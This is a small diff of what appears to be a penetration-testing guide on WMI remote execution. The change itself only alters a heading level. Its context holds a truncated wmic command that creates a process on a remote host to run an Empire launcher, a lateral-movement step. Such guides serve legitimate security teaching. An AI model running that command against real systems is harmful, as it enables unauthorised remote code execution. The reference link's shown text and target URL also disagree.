@@ -128,7 +128,7 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 This process illustrates WMI's capability for remote execution and system enumeration, highlighting its utility for both system administration and penetration testing.
 
 
-# References
+## References
 * [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 ## Automatic Tools
